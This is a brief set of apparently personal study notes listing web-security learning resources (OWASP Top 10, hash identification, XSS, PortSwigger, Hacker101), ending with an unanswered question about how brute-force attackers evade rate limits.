* [somewhat detailed description of owasp top10](https://www.troyhunt.com/owasp-top-10-for-net-developers-part-1/)
* [hash analyser:](https://www.tunnelsup.com/hash-analyzer/) figure out what kind of hashing is being done. Here are some [example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
* Portswigger is a damn good learning and news resource 
* [XSS is a very deep area](https://excess-xss.com/)
* [HackerOne has a free course available for everyone](https://www.hacker101.com/)



# Questions: 

1. when doing brute force attacks, how to bypass rate limits? won't the attacker's ip just be blocked? 